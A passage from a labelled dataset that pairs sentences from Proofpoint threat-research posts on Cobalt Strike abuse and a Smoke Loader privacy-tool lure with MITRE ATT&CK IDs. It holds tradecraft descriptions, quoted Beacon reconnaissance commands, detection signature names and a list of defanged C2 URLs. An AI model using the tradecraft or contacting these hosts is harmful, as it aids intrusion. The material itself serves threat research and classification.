tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon.", "labels": ["S0154", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "This campaign was attributed to threat actors working for Russia\u2019s Foreign Intelligence Service \u2013 a group with Cobalt Strike in their toolbox\u00a0[since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)\u00a02018.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike\u00a0[debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/)\u00a0in 2012 in response to perceived gaps in\u00a0an existing red team tool, the Metasploit Framework.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "By 2016,\u00a0Proofpoint\u00a0researchers\u00a0began observing threat actors using Cobalt Strike.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Historically,\u00a0Cobalt Strike use in malicious operations was largely\u00a0associated with\u00a0well-resourced threat actors,\u00a0including\u00a0[large cybercrime\u00a0operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)\u00a0like\u00a0TA3546\u00a0(also known as FIN7), and advanced persistent threat (APT)\u00a0[groups\u00a0such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets)\u00a0(also known as Leviathan\u00a0or APT40).", "labels": ["S0154", "G0046", "G0046", "G0065", "G0065", "G0065"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Proofpoint researchers have\u00a0attributed two-thirds of\u00a0identified\u00a0Cobalt Strike campaigns\u00a0from 2016 through 2018 to\u00a0well-resourced\u00a0cybercrime organizations or APT groups.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "That ratio decreased\u00a0dramatically the following years\u00a0\u2013 between 2019 and present, just 15\u00a0percent\u00a0of Cobalt Strike campaigns\u00a0were\u00a0attributable to known threat actors.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "*Figure 1: Number of email messages associated with a Cobalt Strike payload observed over\u00a0time.", "labels": ["T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Threat actors\u00a0can obtain Cobalt Strike in a variety of ways:\u00a0purchasing it directly from the\u00a0vendor\u2019s\u00a0website, which requires verification;\u00a0buying\u00a0a version\u00a0on the dark web\u00a0via\u00a0various hacking forums;\u00a0or using cracked, illegitimate\u00a0versions of the software.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In March 2020, a cracked version\u00a0of Cobalt Strike 4.0 was released\u00a0and made available to threat actors.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "### Cobalt Strike\u2019s Appeal", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike is used by a diverse array of threat actors, and while it\u00a0is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in\u00a0that\u00a0\u00a0its\u00a0built-in capabilities\u00a0enable it to\u00a0be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources.", "labels": ["S0154", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike is also\u00a0session-based \u2014 that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory.", "labels": ["S0154", "T1620"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Threat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to\u00a0[blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)\u00a0with legitimate traffic or\u00a0[evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/).", "labels": ["G0016", "S0154", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "For defenders,\u00a0customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild.", "labels": ["S0154", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike\u00a0is also\u00a0appealing to threat actors\u00a0for\u00a0its inherent obfuscation.", "labels": ["S0154", "T1027"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "If\u00a0an organization has\u00a0a red team actively making use of it, it\u00a0is possible malicious traffic could be mistaken as legitimate.", "labels": ["TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Proofpoint data shows\u00a0Cobalt Strike is a\u00a0popular tool\u00a0for everything from strategic compromises to noisy, widespread campaigns.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "The following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike\u00a0tracked by\u00a0Proofpoint.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "**TA800**\u00a0", "labels": [], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "TA800 is a large\u00a0crimeware\u00a0group tracked by Proofpoint since\u00a0mid-2019.", "labels": [], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "This actor attempts to deliver and install banking malware or malware loaders, including\u00a0The Trick and\u00a0BazaLoader.", "labels": ["S0266", "S0534"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In April 2020, TA800 became the first group observed distributing\u00a0BazaLoader.", "labels": ["S0534"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In these early campaigns, the\u00a0threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable.", "labels": ["T1566", "T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "The executable downloaded the\u00a0BazaLoader\u00a0backdoor which in turn downloaded Cobalt Strike.", "labels": ["S0534", "S0154", "T1105"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs.\u00a0", "labels": ["S0154", "T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "There has\u202fbeen some evidence suggesting\u202fTA800\u2019s\u00a0[NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is\u202fbeing\u202fused to download and execute Cobalt Strike as its secondary payload.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "**TA547**\u00a0", "labels": [], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "TA547 is\u00a0a\u00a0crimeware\u00a0actor tracked by Proofpoint since October 2017.", "labels": [], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "This group appears to be interested in distributing primarily banking trojans \u2013 including\u00a0The\u00a0Trick and\u00a0ZLoader\u00a0\u2013 to various geographic\u00a0regions.", "labels": ["S0266"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Since mid-2020, this actor favors using malicious Microsoft\u00a0Office\u00a0attachments to distribute\u00a0malware.", "labels": ["T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In February 2021, TA547\u00a0began distributing Cobalt Strike as a second-stage payload for command and control.", "labels": ["S0154", "T1105", "TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "**TA415**\u00a0", "labels": ["G0096"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "TA415 is an\u00a0APT\u00a0actor\u00a0believed to be associated with\u00a0People\u2019s Republic of China\u00a0(PRC)\u00a0state interests.", "labels": ["G0096"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "TA415 is also known as Barium\u00a0and APT41.", "labels": ["G0096", "G0096", "G0096"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Proofpoint identified TA415\u00a0delivering Cobalt Strike as a first-stage payload\u00a0in limited campaigns during mid-2020.", "labels": ["G0096", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and\u00a0[detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)\u00a0the threat actors use of Cobalt Strike in\u00a0the\u00a0indictment.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "TA415\u00a0used\u00a0Cobalt Strike in a campaign against an entity in the airlines sector.", "labels": ["G0096", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "The following timeline provides\u00a0a small sample of\u00a0threat actor use of Cobalt Strike across cybercrime and APT threats.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "The\u00a0selected\u00a0events\u00a0were identified based on their significance, and\u00a0are not representative of the full Cobalt Strike threat landscape.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "*Figure 2: Timeline of threats using Cobalt Strike.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Proofpoint has observed dozens of threat actors using Cobalt Strike.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Threat actors use different lure themes, threat types, droppers, and payloads.", "labels": ["T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "For example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type.", "labels": ["S0154", "T1566", "T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "While instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick,\u00a0BazaLoader,\u00a0Ursnif,\u00a0IcedID, and many more popular loaders.", "labels": ["S0154", "S0266", "S0534", "S0386", "S0483"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In these cases, the preceding malware typically loads and executes Cobalt Strike.", "labels": ["S0154", "TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Likewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems.", "labels": ["S0154", "T1566", "T1059", "T1559", "T1059", "T1059"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "After Cobalt Strike has been executed and a\u00a0Beacon established\u00a0for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems.", "labels": ["S0154", "S0154", "TA0011", "T1046", "T1486", "TA0006"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "For example, the Cobalt Strike\u00a0[documentation states](https://www.cobaltstrike.com/help-beacon):\u00a0\u00a0", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Use the net\u00a0dclist\u00a0command to find the\u00a0Domain\u00a0Controller for the domain the target is joined to.", "labels": ["T1486", "T1482"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Use the\u00a0net view\u00a0command to find targets on the domain the target is joined to.", "labels": ["T1486"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Use the\u00a0net viewcommand to find targets on the domain the target is joined to.", "labels": ["T1482"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "In addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection.", "labels": ["T1046", "TA0006", "S0154", "S0154", "TA0004", "T1105", "T1055"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Proofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "According to internal data,\u00a0tens of thousands of\u00a0organizations\u00a0have already been targeted\u00a0with\u00a0Cobalt Strike, based on observed campaigns.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "*Figure 3: Number of customers targeted by threats using Cobalt Strike*", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike is a useful tool, for legitimate security researchers and threat actors alike.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Its malleability coupled with\u00a0its usability makes it a robust and effective tool for siphoning data, moving laterally, and\u00a0loading additional malware payloads.", "labels": ["T1105"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Cobalt Strike is not the only red team tool appearing more often in\u00a0Proofpoint\u00a0data.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Others include Mythic, Meterpreter, and the Veil Framework.", "labels": [], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Threat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware.", "labels": ["T1059", "T1055"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "October 2017 \u2013\u00a0[Leviathan: Espionage actor\u00a0spearphishesmaritime and defense targets]", "labels": ["T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "April 2018 \u2013\u00a0[APT\u653b\u6483\u8005\u30b0\u30eb\u30fc\u30d7\u00a0menuPass(APT10)\u00a0\u306b\u3088\u308b\u65b0\u305f\u306a\u653b\u6483\u3092\u78ba\u8a8d]", "labels": ["G0045"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "November 2018 \u2013\u00a0[Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign]", "labels": ["G0016", "T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "December 2020 \u2013\u00a0[Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor]", "labels": ["T1195"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "March 2021 \u2013\u00a0[NimzaLoader: TA800\u2019s New Initial Access Malware]", "labels": ["TA0001"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "May 2021 \u2013\u00a0[New sophisticated email-based attack from NOBELIUM]", "labels": ["T1566"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Proofpoint Emerging Threats includes robust detections for Cobalt Strike.", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2028591 ET TROJAN\u00a0Cobalt Strike Malleable C2 Request YouTube Profile\u00a0", "labels": ["S0154", "TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2028589 ET TROJAN\u00a0Cobalt Strike Malleable C2 Response O365 Profile M2\u00a0", "labels": ["S0154", "TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2032749 ET TROJAN\u00a0Cobalt\u00a0Strike Malleable C2 Amazon Profile\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2032746 ET TROJAN\u00a0Cobalt\u00a0Strike Malleable C2\u00a0QiHoo\u00a0Profile\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2027082 ET TROJAN Observed Malicious SSL Cert\u00a0CobaltStrike\u00a0C2\u00a0", "labels": ["S0154", "TA0011"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike\u00a0", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2032362 ET TROJAN Cobalt Strike Beacon Activity\u00a0", "labels": ["S0154", "S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "2032951 ET TROJAN Observed Cobalt Strike User-Agent\u00a0", "labels": ["S0154"], "document": "proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt"}, {"sentence": "Malware Masquerades as Privacy Tool", "labels": ["T1036"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "* Threat actors created a detailed, legitimate looking \u201cPrivacy Tools\u201d website to trick victims into downloading malware.", "labels": ["T1566"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "* Smoke Loader is downloaded first as the malicious executable which drops follow-on malware including Racoon Stealer and RedLine malware.", "labels": ["S0226", "T1105"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Proofpoint researchers found a new threat enticing users to download malware by masquerading as a \u201cPrivacy Tools\u201d service offering a tool that \u201cencrypts\u201d user data using a zip-like utility.", "labels": [], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Proofpoint researchers identified the initial payload as Smoke Loader, a popular downloader available on easily accessible forums for buying and selling malware and used by multiple threat actors.", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "The malware subsequently installs follow-on data-stealing malware including Raccoon Stealer and RedLine.", "labels": [], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "The privacy theme is ironic considering the ultimate payload is designed to exfiltrate information from an infected host.", "labels": ["TA0010"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Visitors are instructed to download and install Privacy Tools software via a specific section of the website.", "labels": ["T1204"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "The website actually downloads Smoke Loader, a modular downloader with multiple capabilities.", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Smoke Loader first appeared in 2011 and is available for purchase on criminal forums.", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Proofpoint researchers observed that the Smoke Loader infection subsequently downloads follow-on malware to conduct information-gathering activities.", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Identified second-stage payloads include RedLine and Raccoon Stealer malware.", "labels": [], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Raccoon Stealer is an increasingly popular malware that first appeared in 2019.", "labels": [], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "It can steal credentials such as passwords, website cookies, credit card data, system information, and bitcoin wallet contents.", "labels": ["TA0006", "T1082", "T1539"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "RedLine Stealer is a malware that aims to steal information from browsers such as login, autocomplete, passwords, and credit cards.", "labels": ["T1555"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "It also collects information about the user and their system, such as the username, location, hardware configuration, and installed security software.", "labels": ["T1518"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "An [update](https://bartblaze.blogspot.com/2021/06/digital-artists-targeted-in-redline.html) to [RedLine](https://www.proofpoint.com/uk/threat-insight/post/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign) Stealer in early 2021 also added the ability to steal cryptocurrency cold wallets.", "labels": [], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "The privacy-themed websites delivering Smoke Loader in this campaign were registered by ssserviceshop1@yandex[.]ru via Registrar of Domain Names REG[.]ru, LLC.", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Multiple other privacy-themed domains and C2 IPs were also registered with the same email address and registrar.", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "***Analyst Note:***[*Previous research*](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part3/) *published in May 2020 attributed a Smoke Loader-related domain registered with the same email and URL naming conventions as observed in this campaign to TA505.", "labels": ["S0226", "G0092"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "There is no available evidence to attribute the observed activity in the privacy-themed campaigns to TA505.*", "labels": ["G0092"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Based on additional indicators uncovered, it is likely this threat actor is conducting \u2013 and has previously conducted \u2013 similar campaigns using privacy themes and convincing lures to distribute Smoke Loader and follow-on malware.", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "Observed in Identified Smoke Loader Campaign", "labels": ["S0226"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002002131-service1002[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002002231-service1002[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder3100231-service1002[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002002431-service1002[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder1002002531-service1002[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder33417-012425999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test125831-service10020125999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test136831-service10020125999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test147831-service10020125999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test146831-service10020125999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test134831-service10020125999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321est213531-service1002012425999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321yes1t3481-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test13561-service10020125999080321[.]su/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test14781-service10020125999080321[.]info/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test13461-service10020125999080321[.]net/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test15671-service10020125999080321[.]tech/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test12671-service10020125999080321[.]online/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321utest1341-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321uest71-service100201dom25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test61-service10020125999080321[.]website/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test51-service10020125999080321[.]xyz/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test41-service100201pro25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321yest31-service100201rus25999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321rest21-service10020125999080321[.]eu/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test11-service10020125999080321[.]press/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321newfolder4561-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321rustest213-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test281-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test261-service10020125999080321[.]space/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321yomtest251-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321yirtest231-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test391-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test481-service10020125999080321[.]ru/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test571-service10020125999080321[.]pro/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test461-service10020125999080321[.]host/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| http://999080321test231-service10020125999080321[.]fun/ | URL | C2 |", "labels": ["TA0011"], "document": "proofpoint_2021-07-01_malware-masquerades-privacy-tool"}, {"sentence": "| 